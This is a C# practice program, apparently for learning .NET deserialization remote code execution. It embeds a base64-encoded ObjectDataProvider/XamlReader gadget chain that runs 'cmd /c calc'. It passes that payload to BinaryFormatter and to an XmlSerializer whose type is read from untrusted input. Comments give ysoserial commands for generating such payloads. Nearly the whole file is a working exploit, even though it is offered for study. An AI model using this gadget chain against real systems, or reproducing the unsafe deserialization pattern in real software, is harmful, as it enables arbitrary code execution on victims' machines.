using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Serialization;

namespace RcePratice
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var payload =
                "PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8cm9vdCB0eXBlPSJTeXN0ZW0uRGF0YS5TZXJ2aWNlcy5JbnRlcm5hbC5FeHBhbmRlZFdyYXBwZXJgMltbU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzVdLFtTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNV1dLCBTeXN0ZW0uRGF0YS5TZXJ2aWNlcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkiPg0KICAgIDxFeHBhbmRlZFdyYXBwZXJPZlhhbWxSZWFkZXJPYmplY3REYXRhUHJvdmlkZXIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeG1sbnM6eHNkPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgPg0KICAgICAgICA8RXhwYW5kZWRFbGVtZW50Lz4NCiAgICAgICAgPFByb2plY3RlZFByb3BlcnR5MD4NCiAgICAgICAgICAgIDxNZXRob2ROYW1lPlBhcnNlPC9NZXRob2ROYW1lPg0KICAgICAgICAgICAgPE1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgPGFueVR5cGUgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeG1sbnM6eHNkPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgeHNpOnR5cGU9InhzZDpzdHJpbmciPg0KICAgICAgICAgICAgICAgICAgICA8IVtDREFUQVs8UmVzb3VyY2VEaWN0aW9uYXJ5IHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOmQ9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIiB4bWxuczpiPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIgeG1sbnM6Yz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9c3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPjxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48YjpTdHJpbmc+Y21kPC9iOlN0cmluZz48YjpTdHJpbmc+L2MgY2FsYzwvYjpTdHJpbmc+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT5dXT4NCiAgICAgICAgICAgICAgICA8L2FueVR5cGU+DQogICAgICAgICAgICA8L01ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8T2JqZWN0SW5zdGFuY2UgeHNpOnR5cGU9IlhhbWxSZWFkZXIiPjwvT2JqZWN0SW5zdGFuY2U+DQogICAgICAgIDwvUHJvamVjdGVkUHJvcGVydHkwPg0KICAgIDwvRXhwYW5kZWRXcmFwcGVyT2ZYYW1sUmVhZGVyT2JqZWN0RGF0YVByb3ZpZGVyPg0KPC9yb290Pg0K";

            var bytes = Convert.FromBase64String(payload);

            BinaryFormatterRce(bytes);


            ObjectDataProviderRce(bytes);
        }

        private static void BinaryFormatterRce(byte[] bytes)
        {
            // ysoserial.exe - f BinaryFormatter - g TypeConfuseDelegate - o base64 - c "calc" - t
            BinaryFormatter formatter = new BinaryFormatter
            {
                //AssemblyFormat = FormatterAssemblyStyle.Simple
            };

            using (var stream = new MemoryStream(bytes))
            {
                formatter.Deserialize(stream);
            }
        }

        private static void ObjectDataProviderRce(byte[] bytes)
        {
            // ysoserial.exe - f XmlSerializer - g ObjectDataProvider - o base64 - c "calc" - t--var = 2
            //
            // ysoserial.exe - f XmlSerializer - g ObjectDataProvider - o raw - c "calc" - t
            var xmlDoc = new XmlDocument();

            xmlDoc.Load(new MemoryStream(bytes));

            foreach (XmlElement xmlItem in xmlDoc.SelectNodes("/root"))
            {
                string typeName = xmlItem.GetAttribute("type");
                Console.WriteLine(typeName);

                var xser = new XmlSerializer(Type.GetType(typeName));

                var reader = new XmlTextReader(new StringReader(xmlItem.InnerXml));
                xser.Deserialize(reader);
            }
        }
    }
}
